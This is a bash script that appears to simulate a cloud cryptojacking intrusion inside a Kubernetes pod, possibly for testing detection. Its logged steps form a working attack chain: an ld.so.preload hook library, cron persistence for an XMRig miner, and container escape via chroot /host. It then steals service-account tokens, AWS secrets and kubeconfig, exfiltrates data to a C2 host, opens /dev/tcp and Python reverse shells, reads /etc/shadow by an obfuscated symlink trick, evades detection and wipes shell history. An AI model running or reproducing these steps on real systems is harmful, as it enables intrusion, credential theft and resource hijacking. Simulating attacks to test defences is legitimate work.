#!/bin/bash

export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
DIR_ARRAY=("/tmp" "/var/tmp" "/dev/shm" "/bin" "/sbin" "/usr/bin" "/usr/sbin")

# Simple logger for colored output
log() {
    COLOR=$1
    MSG=$2
    echo -e "\e[${COLOR}m[$(date +'%T')] ${MSG}\e[0m"
}

RED="31"
GREEN="32"
YELLOW="33"
BLUE="34"
MAGENTA="35"
CYAN="36"

log "$CYAN" "Handling some filemods ..."
CHECKCHMOD=$(command -v mchmod)
if ! [ -z "$CHECKCHMOD" ] ; then
  log "$BLUE" "Found mchmod, removing immutable attributes from chmod"
  mchattr -ia $(command -v chmod) 2>/dev/null
  tntrecht -ia $(command -v chmod) 2>/dev/null
  mchmod +x $(command -v chmod) 2>/dev/null
fi

CHECKCHATTR=$(command -v mchattr)
if ! [ -z "$CHECKCHATTR" ] ; then
  log "$BLUE" "Found mchattr, removing immutable attributes from chattr"
  mchattr -ia $(command -v chattr) 2>/dev/null
  tntrecht -ia $(command -v chattr) 2>/dev/null
  mchmod +x $(command -v chattr) 2>/dev/null
  chmod +x $(command -v chattr) 2>/dev/null
fi

log "$CYAN" "Handling preload ld ..."
if [ -f "/etc/ld.so.preload" ] ; then
  log "$YELLOW" "Found: /etc/ld.so.preload"
  chattr -ia / /etc/ /etc/ld.so.preload 2>/dev/null
  log "$YELLOW" "Current preload content:"
  cat /etc/ld.so.preload
  rm -f /etc/ld.so.preload
else
  log "$BLUE" "No /etc/ld.so.preload file found!"
fi

log "$CYAN" "Handling dir permissions ld ..."
for DIR in "${DIR_ARRAY[@]}"; do
  if [ -d "$DIR" ] ; then
    if [ -w "$DIR" ] ; then
      log "$GREEN" "Write rights in $DIR available."
    else
      log "$YELLOW" "No write permissions in $DIR available. Try to fix the error."
      chattr -ia "$DIR" 2>/dev/null
      if [ -w "$DIR" ] ; then
        log "$GREEN" "Write rights in $DIR available."
      else
        log "$RED" "Still no write access in $DIR."
      fi
    fi
  fi
done

log "$CYAN" "Staging payloads..."
if [ -w /usr/sbin ] ; then
  export SPATH=/usr/sbin
elif [ -w /tmp ] ; then
  export SPATH=/tmp
else
  export SPATH=/var/tmp
fi
log "$GREEN" "Using $SPATH for binary path"

# These files are already downloaded by dropper.sh in /tmp/payloads
log "$BLUE" "Copying required binaries from /tmp/payloads to $SPATH"
cp /tmp/payloads/xmx2 $SPATH/xmx2
cp /tmp/payloads/cc.py $SPATH/cc.py
chmod +x $SPATH/xmx2

log "$CYAN" "Adding library to hook system calls..."
chattr -ia / /usr/ /usr/local/ /usr/local/lib/ 2>/dev/null
log "$BLUE" "Copying hook.so to /usr/local/lib/"
cp /tmp/payloads/hook.so /usr/local/lib/hook.so
log "$YELLOW" "Creating new preload file with hook.so"
echo '/usr/local/lib/hook.so' > /etc/ld.so.preload
log "$BLUE" "Setting immutable attribute on preload file"
chattr +i /etc/ld.so.preload 2>/dev/null

log "$CYAN" "Creating persistence with a cron job ..."
(crontab -l 2>/dev/null; echo "@reboot ${SPATH}/xmx2 --config=${SPATH}/config.json") | crontab -
log "$GREEN" "Persistence via cron job established."

log "$CYAN" "Attempting legacy container escape (noumt)..."
log "$YELLOW" "(This is expected to fail on modern systems due to host-level security)"
cp /tmp/payloads/noumt /tmp/noumt
chmod +x /tmp/noumt
timeout 15 /tmp/noumt

log "$CYAN" "Executing direct container escape (chroot /host)..."
PROOF_FILE="/host/tmp/ESCAPE_SUCCESSFUL"
# The command to run ON THE HOST after escaping
HOST_COMMAND="echo 'Container escape via chroot successful' > /tmp/ESCAPE_SUCCESSFUL"

# Use chroot to execute the command on the host.
chroot /host /bin/bash -c "$HOST_COMMAND"

# AUTOMATED VERIFICATION STEP
log "$CYAN" "Verifying escape success..."
sleep 1 # Give the filesystem a moment to sync
if [ -f "$PROOF_FILE" ]; then
    log "$GREEN" "✅ SUCCESS: Escape verified. Proof file found at $PROOF_FILE"
    log "$GREEN" "Host file content: $(cat $PROOF_FILE)"
else
    log "$RED" "❌ FAILURE: Escape failed. Proof file not found at $PROOF_FILE"
fi
# --- END OF REPLACEMENT ---


HIDDEN_DIR="/dev/shm/.../...HIDDEN.../"
mkdir -p "$HIDDEN_DIR"

log "$CYAN" "Extracting K8s service tokens..."
TOKEN_FILE="$HIDDEN_DIR/K8s.txt"
if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ] ; then
  log "$GREEN" "Found K8s ServiceToken."
  cat /var/run/secrets/kubernetes.io/serviceaccount/token > "$TOKEN_FILE"
fi

log "$CYAN" "Sending data to C2 server"
export TOKENFILE="$TOKEN_FILE"
(
python3 -c '
import requests
import os
import socket
import time
import sys

tokenfile = os.environ.get("TOKENFILE")
print("Reading from {}".format(tokenfile))
if os.path.exists(tokenfile):
    print("File size: {} bytes".format(os.path.getsize(tokenfile)))
else:
    print("Token file does not exist.")
    sys.exit(0)

for attempt in range(3):
    try:
        server = "payload-server.default.svc.cluster.local"
        try:
            ip = socket.gethostbyname(server)
            print("Resolved {} to {}".format(server, ip))
        except Exception as dns_err:
            print("Could not resolve {}: {}".format(server, dns_err))
            server = "localhost" # Fallback
            
        print("Sending data to http://{}:8080/ (attempt {})".format(server, attempt+1))
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(3)
            if sock.connect_ex((server, 8080)) != 0:
                print("Server {}:8080 is NOT reachable".format(server))
                if attempt < 2: time.sleep(2)
                continue
        
        with open(tokenfile, "rb") as f:
            response = requests.post(
                "http://{}:8080/".format(server), 
                files={"file": (os.path.basename(tokenfile), f, "text/plain")}
            )
        print("Data exfiltration status: {}".format(response.status_code))
        if response.status_code == 200:
            print("Exfiltration successful!")
            break
        
        if attempt < 2: time.sleep(2)
            
    except Exception as e:
        print("Error during exfiltration: {}".format(str(e)))
        if attempt < 2: time.sleep(2)
'
) || log "$RED" "Data exfiltration failed but continuing with attack"
rm -f "$TOKEN_FILE"

log "$CYAN" "Collecting sensitive information..."
SENSITIVE_DATA_FILE="$HIDDEN_DIR/sensitive_info.txt"
if type aws &>/dev/null; then
  aws configure list >> "$SENSITIVE_DATA_FILE" 2>/dev/null
fi
env | grep -iE 'AWS|SECRET|KEY|TOKEN|PASSWORD' >> "$SENSITIVE_DATA_FILE"
if [ -f ~/.kube/config ]; then
  cat ~/.kube/config >> "$SENSITIVE_DATA_FILE"
fi

log "$CYAN" "Scanning the host ..."
(timeout 20 python3 -c '
import socket
import time

print("\n===== QUICK PORT SCAN =====")
def scan_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        return s.connect_ex((ip, port)) == 0
    except: return False

payload_server = "payload-server.default.svc.cluster.local"
try:
    payload_ip = socket.gethostbyname(payload_server)
    print(f"Scanning C2 at {payload_ip}...")
    for port in [8080, 4444, 7456]:
        if scan_port(payload_ip, port): print(f"Port {port}: OPEN")
except Exception as e:
    print(f"Could not resolve C2: {e}")
print("===== SCAN COMPLETE =====")
') || log "$RED" "Port scanning timed out, continuing..."

log "$CYAN" "Creating reverse shell ..."
PAYLOAD_IP=$(getent hosts payload-server.default.svc.cluster.local | awk '{ print $1 }' | head -n 1)
if [ -z "$PAYLOAD_IP" ]; then
    log "$YELLOW" "Could not resolve C2, skipping reverse shell."
else
    log "$GREEN" "Resolved C2 to $PAYLOAD_IP"
    log "$BLUE" "Attempting multiple reverse shell methods..."
    (timeout 5 bash -c "exec 3<>/dev/tcp/$PAYLOAD_IP/4444 && cat >&3 && cat <&3" 2>/dev/null) &
    (
    export PAYLOAD_IP
    python3 -c '
import socket, subprocess, os
host = os.environ.get("PAYLOAD_IP")
port = 7456 # Using the second port for this attempt
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
    p = subprocess.call(["/bin/sh","-i"])
except Exception: pass
'
    ) &
fi

log "$CYAN" "Reading /etc/shadow..."
ln -s $(rev<<<'wodahs/cte/') /tmp/1 && wc --files0-from /tmp/1 2>/dev/null | head -n 1
rm -f /tmp/1

log "$CYAN" "Executing renamed binary with evasive suffix..."
cp $(command -v cat) /tmp/a.py && /tmp/a.py /etc/hosts >/dev/null
log "$GREEN" "Evasion technique demonstration complete."

log "$CYAN" "Clearing bash history ..."
cat /dev/null > ~/.bash_history
history -c

log "$CYAN" "Executing XMRig miner..."
# Copy the config to the execution directory
cp /tmp/payloads/config.json $SPATH/config.json

# Run the miner for 15 seconds. Its output will now be visible in the pod logs.
# The timeout command will automatically kill it after the duration.
timeout -k 2 15 $SPATH/xmx2 --config=$SPATH/config.json
log "$GREEN" "Mining attempt complete."
